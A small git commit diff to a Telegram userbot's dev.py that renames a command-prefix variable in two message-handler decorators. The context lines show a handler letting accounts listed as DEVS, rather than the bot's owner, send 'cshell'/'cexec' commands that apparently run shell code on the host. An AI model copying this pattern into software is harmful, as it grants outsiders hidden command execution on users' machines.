083be09f2afe135a612901bd621aca13c194efb6
OnlyMeRiz <73426077+Onlymeriz@users.noreply.github.com>
2023-03-15 14:54:53 +0700

    update dev.py

--- Ubot/modules/basic/dev.py
+++ Ubot/modules/basic/dev.py
@@ -121,8 +121,8 @@ async def shell_exec(code, treat=True):
     return stdout, process
 
 
-@Client.on_edited_message(filters.command(["cshell", "cexec"], cmd) & filters.user([DEVS]) & ~filters.me)
-@Client.on_edited_message(filters.command(["shell", "exec"], cmd) & filters.me)
+@Client.on_edited_message(filters.command(["cshell", "cexec"], cmds) & filters.user([DEVS]) & ~filters.me)
+@Client.on_edited_message(filters.command(["shell", "exec"], cmds) & filters.me)
 async def execution_func_edited(bot, message):
     await execution(bot, message)
 
